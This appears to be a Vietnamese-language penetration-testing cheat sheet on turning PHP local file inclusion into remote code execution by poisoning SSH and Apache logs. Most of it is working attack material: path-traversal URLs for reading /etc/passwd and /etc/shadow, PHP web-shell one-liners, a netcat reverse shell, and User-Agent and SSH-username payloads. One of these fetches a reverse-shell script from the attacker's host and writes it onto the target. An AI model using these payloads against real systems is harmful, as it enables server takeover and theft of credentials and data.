# LFI_TO_RCE_VIA_LOG_POISONING
## What is a file inclusion vulnerability ?
Nguyên nhân: do xác thực đầu vào kém. Trong code php web, các lập trình viên thường sử dụng các lệnh include, require, include_once, require _ once , các lệnh này cho phép việc file hiện tại có thể gọi ra 1 file khác.

Dấu hiệu để nhận biết rằng trang web có thể tấn công file inclusion là đường link thường có dạng ```php?page=,hoặc php?file= ....``` 

Kết quả: cho phép attacker truy cập trái phép vào những tập tin nhạy cảm trên máy chủ web hoặc thực thi các tệp tin độc hại

File Inclusion có thể dẫn đến các cuộc tấn công sau :
- Code execution on the web server
- Cross Site Scripting Attacks (XSS)
- Denial of service (DOS)
- Data Manipulation Attacks
## What is LFI to RCE ?
Local file inclustion (LFI) là lỗi cơ bản của các trang web, thông thường là do lỗi cấu hình che dấu file và sai sót khi filter input form , cho phép bạn di chuyển vào thư mục và đọc tệp (path traversal). Nó có thể cung cấp các thông tin nhảy cảm như là passwd, php.ini, access_log, config.php…, đôi khi có thể được sử dụng dể Remote Code Execution (RCE)
```
<?php
$file = $_GET['file'];

 include("/" . $file.".php");      <---- vulnerable LFI
?>
```
Để thực hiện cuộc tấn công này, chúng ta cần trở lại thư mục root bằng cách sử dụng biến tham chiếu ``` ../ ``` (đại điện cho các thư mục đằng trước)

Sau khi đến được thư mục root, để đọc file chứa thông tin về các người dùng, ta sử dụng /etc/passwd (cho hệ điều hành trên UNIX)

Tham khảo 1 số file phổ biến:
- /etc/passwd: có tất cả người dùng đã đăng kí có quyền truy cập vào hệ thống.
- /etc/shadow: chứa thông tin về mật khẩu của người dùng trong hệ thống.
- /root/.bash_history: chứa các lệnh đã được thực thi của root
- /proc/version: chứa thông tin về phiên bản kernel của hệ thống
Thêm "../../../../etc/passwd%00" vào URL
```
Example URL: http//10.10.10.10/index.php?file=../../../../etc/passwd%00
```    
Muốn truy cập một file không phải kiểu “text” chúng sẽ sử dụng một %00 (kí tự byte rỗng sau tên của file)
```
<?php
$file = $_GET['file'];

 include("/../../../../etc/passwd%00.php");      <---- path traversal to LFI
?>
```
LFI vulnerable PHP functions: 
- include()
- include_once()
- require()
- require_once()
- fopen() 

Remote Code Execution (RCE) nghĩ là thực thi code từ xa, Tức là bạn có thể thông qua một kĩ thuật nào đó để có thể đạt được quyền điều khiển trên máy nạn nhân, thông qua đó có thể thực thi bash, shell...hoặc code của một vài ngôn ngữ kịch bản như python, perl, javascript...
```
<?php system($_GET['c']); ?>
<?php system($_REQUEST['c']$); ?>

<?php
$os = shell_exec('id');
echo "<pre>$os</pre>";
?>

<?php
$os = shell_exec('nc 10.10.10.10 4444 -e /bin/bash');
?>

// Replace IP & Port

Dangerous PHP Functions that can be abused for RCE
<?php
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```
Other ways to inject your code:
- Using directory traversal to read files
- Log poisoning
- Session variables
- Uploaded files
- Emails
- Shared hosting
- FTP and orther logs
## What is Log poisoning ?
Log poisoning – thực hiện lây nhiễm mã độc vào tệp tin nhật ký. Chúng ta có thể sử dụng cách chèn tập tin từ máy chủ nội bộ thông qua một lỗ hổng quen thuộc – Local File Inclusion để chèn mã độc và thực thi lệnh tùy ý trên hệ thống.

Trước khi đi vào nội dung vấn đề, chúng ta cần biết một chút về máy chủ và cơ chế ghi log của chúng. Một máy chủ web thường chứa một vài dịch vụ khác nhau như SSH, Apache, MySQL, FTP … Hầu hết các dịch vụ này đều có các tệp tin log và được lưu trữ ngay tại máy chủ

### Dữ liệu nhật ký của SSH
SSH viết tắt của Secure Shell, là một giao thức được sử dụng để kết nối và điều khiển một thiết bị. Nó cho phép bạn thực thi lệnh, quản lí thiết bị từ xa. Các lệnh đăng nhập vào thiết bị từ xa thông qua SSH như sau:
```
ssh <user>@<ip/domain>
ssh <ip/domain> -l <user>
```
Khi người dùng cố gắng kết nối đến thiết bị thông qua SSH sẽ được ghi lại vào một tệp tin nhật ký kiểu như auth.log. Thông điệp được ghi lại phụ thuộc vào kết quả của một lần đăng nhập.

Đăng nhập thành công

```Accepted password from <user> from <ip> port ......```

Đăng nhập thất bại

```Failed password from <user> from <ip> port ......```

LFI to RCE via SSH Log File Poisoning (PHP)
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 

Payload: ssh <?php system($_GET['c']);?>@<target_ip>

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id
```
### Dữ liệu nhật ký của Apache
Apache là một máy chủ web được sử dụng rất phổ biến để triển khai các hệ thống website. Nó có hai tệp tin nhật ký chính là nhật ký truy cập và nhật ký ghi lại các báo lỗi của hệ thống. Nhật ký truy cập chứa thông tin về tất cả các yêu cầu được gửi lên máy chủ và nhật ký thông báo lỗi chứa thông điệp lỗi của hệ thống. 

Phần chúng ta quan tâm là nhật ký truy cập. Cấu trúc của tệp tin chứa thông tin nhật ký truy cập như sau (tùy từng loại cấu hình có thể có các định dạng khác nhau, tuy nhiên về cơ bản nó cung cấp các thông tin tương tự như dòng dữ liệu bên dưới):

```127.0.0.1 - - [06/Nov/2014:17:14:31 +0100] "GET / HTTP/1.1" 200 7562 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36"```

Chúng ta sẽ chia dòng dữ liệu này thành 3 phần:

```"GET / HTTP/1.1": Phương thức request```

```"-": Referer```

```"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36" : Thông tin về máy khách đã gửi yêu cầu đến (User agent).```

Tất cả các giá trị này đều dễ dàng thay đổi bởi người dùng.

LFI to RCE via Apache Log File Poisoning (PHP)

```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 

Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id

OR

python -m SimpleHTTPServer 9000 

Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 

file_put_contents('shell.php')                                // What it will be saved locally on the target
file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called

Execute PHP Reverse Shell: http//10.10.10.10/shell.php
```
